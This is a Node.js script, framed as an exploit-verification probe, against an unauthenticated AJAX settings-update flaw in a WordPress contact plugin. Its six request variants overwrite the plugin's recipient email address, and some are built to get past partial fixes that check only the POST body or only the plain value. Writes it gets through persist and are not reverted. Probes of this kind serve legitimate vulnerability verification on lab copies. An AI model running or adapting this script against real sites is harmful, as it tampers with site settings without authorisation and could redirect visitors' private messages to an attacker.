// Exploit-verification probe: Quick Contact <= 1.0.0 unauthenticated settings update
// (qc_save_settings AJAX action registered via wp_ajax_nopriv_* with no capability check).
//
// Usage: node probe.mjs <base-url>
//   exit 0 -> target is VULNERABLE (at least one attack variant was accepted)
//   exit 1 -> target is NOT vulnerable (every variant was rejected)
//   exit 2 -> probe could not reach/understand the target (indeterminate)
//
// Only requests to the given base URL are sent. No files are written.

import { randomBytes } from 'node:crypto';

const EXIT_VULNERABLE = 0;
const EXIT_NOT_VULNERABLE = 1;
const EXIT_INDETERMINATE = 2;

const rawBase = process.argv[2];
if (!rawBase) {
  console.error('usage: node probe.mjs <base-url>');
  process.exit(EXIT_INDETERMINATE);
}

let base;
try {
  base = new URL(rawBase);
} catch {
  console.error(`invalid base URL: ${rawBase}`);
  process.exit(EXIT_INDETERMINATE);
}
if (base.protocol !== 'http:' && base.protocol !== 'https:') {
  console.error(`unsupported protocol: ${base.protocol}`);
  process.exit(EXIT_INDETERMINATE);
}

const AJAX_PATH = '/wp-admin/admin-ajax.php';
const ACTION = 'qc_save_settings';
const TIMEOUT_MS = 10000;

// Unique, unremarkable marker address; it is only ever sent to the target.
const marker = `qc-${randomBytes(6).toString('hex')}@example.com`;

function ajaxUrl(withQuery) {
  const u = new URL(AJAX_PATH, base);
  if (withQuery) {
    for (const [k, v] of Object.entries(withQuery)) u.searchParams.set(k, v);
  }
  return u;
}

// Each variant describes one way a request can carry `action` and `recipient`.
// Because the handler reads $_REQUEST, the parameters may arrive via query
// string, urlencoded body, or multipart body. Filters/fixes that only inspect
// one channel (e.g. $_POST) or only the obvious payload may miss the others.
const variants = [
  {
    name: 'POST urlencoded body (action + recipient in body)',
    send: () => fetch(ajaxUrl(), {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({ action: ACTION, recipient: marker }).toString(),
    }),
  },
  {
    name: 'GET query string (action + recipient in query)',
    send: () => fetch(ajaxUrl({ action: ACTION, recipient: marker }), { method: 'GET' }),
  },
  {
    name: 'POST multipart body (action + recipient in body)',
    send: () => {
      const fd = new FormData();
      fd.append('action', ACTION);
      fd.append('recipient', marker);
      return fetch(ajaxUrl(), { method: 'POST', body: fd });
    },
  },
  {
    name: 'action in query, recipient in POST body',
    send: () => fetch(ajaxUrl({ action: ACTION }), {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({ recipient: marker }).toString(),
    }),
  },
  {
    name: 'action in POST body, recipient in query string',
    send: () => fetch(ajaxUrl({ recipient: marker }), {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({ action: ACTION }).toString(),
    }),
  },
  {
    name: 'POST body with padded recipient value (whitespace/case)',
    send: () => fetch(ajaxUrl(), {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({ action: ACTION, recipient: `  ${marker.toUpperCase()}  ` }).toString(),
    }),
  },
];

// Success is only counted when the handler itself reports success:true.
// A correctly fixed handler returns an error (wp_send_json_error, or wp_die(-1)/"0"),
// never {"success":true}.
async function classify(res) {
  const text = await res.text();
  let json;
  try {
    json = JSON.parse(text);
  } catch {
    return { accepted: false, detail: `HTTP ${res.status}, non-JSON body (${text.slice(0, 60).replace(/\s+/g, ' ')})` };
  }
  const accepted = res.status === 200 && json && json.success === true;
  return { accepted, detail: `HTTP ${res.status}, body=${text.slice(0, 120)}` };
}

let anyAccepted = false;
let reachable = false;
const acceptedVariants = [];

for (const v of variants) {
  try {
    const res = await v.send();
    reachable = true;
    const { accepted, detail } = await classify(res);
    console.log(`[${accepted ? 'ACCEPTED' : 'rejected'}] ${v.name}: ${detail}`);
    if (accepted) {
      anyAccepted = true;
      acceptedVariants.push(v.name);
    }
  } catch (err) {
    console.log(`[error] ${v.name}: ${err && err.message ? err.message : err}`);
  }
}

// Restoration note: qc_recipient has no unauthenticated read path (qc_send stores
// the recipient into qc_messages but never returns it), so the prior value cannot
// be captured or restored here. Any accepted write leaves qc_recipient set to the
// marker address, which is expected for this throwaway lab copy.
if (anyAccepted) {
  console.log(`marker recipient used: ${marker}`);
  console.log(`VULNERABLE: accepted via ${acceptedVariants.join('; ')}`);
  process.exit(EXIT_VULNERABLE);
}

if (!reachable) {
  console.log('INDETERMINATE: no variant reached the target');
  process.exit(EXIT_INDETERMINATE);
}

console.log('NOT VULNERABLE: all variants rejected');
process.exit(EXIT_NOT_VULNERABLE);
